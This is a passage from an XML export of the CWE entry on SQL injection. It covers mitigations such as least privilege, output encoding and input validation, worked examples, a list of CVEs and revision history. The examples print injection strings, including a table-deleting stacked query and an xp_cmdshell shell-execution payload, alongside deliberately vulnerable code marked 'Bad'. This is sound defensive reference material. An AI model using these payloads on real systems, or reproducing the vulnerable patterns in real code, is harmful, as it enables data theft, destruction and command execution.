                  <xhtml:p>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</xhtml:p>
                  <xhtml:p>Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-28">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>
                  <xhtml:p>While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).</xhtml:p>
                  <xhtml:p>Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When constructing SQL query strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name "O'Reilly" would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the "'" apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded.</xhtml:p>
                  <xhtml:p>When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.</xhtml:p>
                  <xhtml:p>If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.</xhtml:p>
		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.</xhtml:p>
                  <xhtml:p>In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In 2008, a large number of web servers were compromised using the same SQL injection attack string. This single string worked against many different programs. The SQL injection was then used to modify the web sites to serve malicious code.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user.</Intro_Text>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>...<xhtml:br/>string userName = ctx.getAuthenticatedUserName();<xhtml:br/>string query = "SELECT * FROM items WHERE owner = '" + userName + "' AND itemname = '" + ItemName.Text + "'";<xhtml:br/>sda = new SqlDataAdapter(query, conn);<xhtml:br/>DataTable dt = new DataTable();<xhtml:br/>sda.Fill(dt);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The query that this code intends to execute follows:</Body_Text>
               <Example_Code Nature="Informative">
                  <xhtml:div>SELECT * FROM items WHERE owner = &lt;userName&gt; AND itemname = &lt;itemName&gt;;</xhtml:div>
               </Example_Code>
               <Body_Text>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>name' OR 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>for itemName, then the query becomes the following:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';</xhtml:div>
               </Example_Code>
               <Body_Text>The addition of the:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>OR 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>condition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>SELECT * FROM items;</xhtml:div>
               </Example_Code>
               <Body_Text>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example examines the effects of a different malicious value passed to the query constructed and executed in the previous example.</Intro_Text>
               <Body_Text>If an attacker with the user name wiley enters the string:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>name'; DELETE FROM items; --</xhtml:div>
               </Example_Code>
               <Body_Text>for itemName, then the query becomes the following two queries:</Body_Text>
               <Example_Code Nature="Attack" Language="SQL">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';<xhtml:br/>DELETE FROM items;<xhtml:br/>
                     <xhtml:i>--'</xhtml:i>
                     <xhtml:br/>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.</Body_Text>
               <Body_Text>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in the previous example.</Body_Text>
               <Body_Text>If an attacker enters the string</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>name'; DELETE FROM items; SELECT * FROM items WHERE 'a'='a</xhtml:div>
               </Example_Code>
               <Body_Text>Then the following three valid statements will be created:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';<xhtml:br/>DELETE FROM items;<xhtml:br/>SELECT * FROM items WHERE 'a'='a';</xhtml:div>
               </Example_Code>
               <Body_Text>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allowlist of safe values or identify and escape a denylist of potentially malicious values. Allowlists can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, denylisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:</Body_Text>
               <Body_Text>
                  <xhtml:ul>
                     <xhtml:li>
                        <xhtml:div>Target fields that are not quoted</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>Find ways to bypass the need for certain escaped meta-characters</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>Use stored procedures to hide the injected meta-characters.</xhtml:div>
                     </xhtml:li>
                  </xhtml:ul>
               </Body_Text>
               <Body_Text>Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.</Body_Text>
               <Body_Text>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they do not protect against many others. For example, the following PL/SQL procedure is vulnerable to the same SQL injection attack shown in the first example.</Body_Text>
               <Example_Code Nature="Bad">
                  <xhtml:div>procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm in varchar2)<xhtml:br/>is open itm_cv for<xhtml:br/>' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND itemname = ' || itm || ';<xhtml:br/>end get_item;</xhtml:div>
               </Example_Code>
               <Body_Text>Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>MS SQL has a built in function that enables shell command execution. An SQL injection in such a context could be disastrous. For example, a query of the form:</Intro_Text>
               <Example_Code Nature="Bad">
                  <xhtml:div>SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICE</xhtml:div>
               </Example_Code>
               <Body_Text>Where $user_input is taken from an untrusted source.</Body_Text>
               <Body_Text>If the user provides the string:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>'; exec master..xp_cmdshell 'dir' --</xhtml:div>
               </Example_Code>
               <Body_Text>The query will take the following form:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec master..xp_cmdshell 'dir' --' ORDER BY PRICE</xhtml:div>
               </Example_Code>
               <Body_Text>Now, this query can be broken down into:</Body_Text>
               <Body_Text>
                  <xhtml:ol>
                     <xhtml:li>
                        <xhtml:div>a first SQL query: SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='';</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>a second SQL query, which executes the dir command in the shell: exec master..xp_cmdshell 'dir'</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>an MS SQL comment: --' ORDER BY PRICE</xhtml:div>
                     </xhtml:li>
                  </xhtml:ol>
               </Body_Text>
               <Body_Text>As can be seen, the malicious input changes the semantics of the query into a query, a shell command execution and a comment.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code intends to print a message summary given the message ID.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$id = $_COOKIE["mid"];<xhtml:br/>mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer may have skipped any input validation on $id under the assumption that attackers cannot modify the cookie. However, this is easy to do with custom client code or even in the web browser.</Body_Text>
               <Body_Text>While $id is wrapped in single quotes in the call to mysql_query(), an attacker could simply change the incoming mid cookie to:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>1432' or '1' = '1</xhtml:div>
               </Example_Code>
               <Body_Text>This would produce the resulting query:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'</xhtml:div>
               </Example_Code>
               <Body_Text>Not only will this retrieve message number 1432, it will retrieve all other messages.</Body_Text>
               <Body_Text>In this case, the programmer could apply a simple modification to the code to eliminate the SQL injection:</Body_Text>
               <Example_Code Nature="Good" Language="PHP">
                  <xhtml:div>$id = intval($_COOKIE["mid"]);<xhtml:br/>mysql_query("SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'");</xhtml:div>
               </Example_Code>
               <Body_Text>However, if this code is intended to support multiple users with different message boxes, the code might also need an access control check (CWE-285) to ensure that the application user has the permission to see that message.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example attempts to take a last name provided by a user and enter it into a database.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>$userKey = getUserID();<xhtml:br/>$name = getUserInput();<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i># ensure only letters, hyphens and apostrophe are allowed</xhtml:i>
                     <xhtml:br/>$name = allowList($name, "^a-zA-z'-$");<xhtml:br/>$query = "INSERT INTO last_names VALUES('$userKey', '$name')";</xhtml:div>
               </Example_Code>
               <Body_Text>While the programmer applies an allowlist to the user input, it has shortcomings. First of all, the user is still allowed to provide hyphens, which are used as comment structures in SQL. If a user specifies "--" then the remainder of the statement will be treated as a comment, which may bypass security logic. Furthermore, the allowlist permits the apostrophe, which is also a data / command separator in SQL. If a user supplies a name with an apostrophe, they may be able to alter the structure of the whole statement and even change control flow of the program, possibly accessing or modifying confidential information. In this situation, both the hyphen and apostrophe are legitimate characters for a last name and permitting them is required. Instead, a programmer may want to use a prepared statement or apply an encoding routine to the input to prevent any data / directive misinterpretations.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-42258</Reference>
               <Description>SQL injection in time and billing software, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-42258</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-27101</Reference>
               <Description>SQL injection in file-transfer system via a crafted Host header, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-27101</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-12271</Reference>
               <Description>SQL injection in firewall product's admin interface or user portal, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-12271</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-3792</Reference>
               <Description>An automation system written in Go contains an API that is vulnerable to SQL injection allowing the attacker to read privileged data.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-3792</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0366</Reference>
               <Description>chain: SQL injection in library intended for database authentication allows SQL injection and authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0366</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2790</Reference>
               <Description>SQL injection through an ID that was supposed to be numeric.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2790</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2223</Reference>
               <Description>SQL injection through an ID that was supposed to be numeric.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2223</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6602</Reference>
               <Description>SQL injection via user name.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-6602</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5817</Reference>
               <Description>SQL injection via user name or password fields.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5817</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0377</Reference>
               <Description>SQL injection in security product, using a crafted group name.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0377</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2380</Reference>
               <Description>SQL injection in authentication library.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2380</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-11508</Reference>
               <Description>SQL injection in vulnerability management and reporting tool, using a crafted password.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-11508</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>SQL injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>SQL Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>SQL injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>19</Entry_ID>
               <Entry_Name>SQL Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-89</Entry_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Oracle Coding Standard for Java">
               <Entry_ID>IDS00-J</Entry_ID>
               <Entry_Name>Prevent SQL injection</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="108"/>
            <Related_Attack_Pattern CAPEC_ID="109"/>
            <Related_Attack_Pattern CAPEC_ID="110"/>
            <Related_Attack_Pattern CAPEC_ID="470"/>
            <Related_Attack_Pattern CAPEC_ID="66"/>
            <Related_Attack_Pattern CAPEC_ID="7"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 1: SQL Injection.&#34; Page 3"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 12, &#34;Database Input Issues&#34; Page 397"/>
            <Reference External_Reference_ID="REF-867"/>
            <Reference External_Reference_ID="REF-868"/>
            <Reference External_Reference_ID="REF-869"/>
            <Reference External_Reference_ID="REF-870"/>
            <Reference External_Reference_ID="REF-871"/>
            <Reference External_Reference_ID="REF-872"/>
            <Reference External_Reference_ID="REF-873"/>
            <Reference External_Reference_ID="REF-874"/>
            <Reference External_Reference_ID="REF-875"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 8, &#34;SQL Queries&#34;, Page 431"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;SQL Injection&#34;, Page 1061"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-89"/>
         </References>
         <Notes>
            <Note Type="Relationship">SQL injection can be resultant from special character mismanagement, MAID, or denylist/allowlist problems. It can be primary to authentication errors.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Modes_of_Introduction, Name, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>KDM Analytics</Modification_Name>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Name, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Name, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Likelihood_of_Exploit, Modes_of_Introduction, Observed_Examples, References, Relationships, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
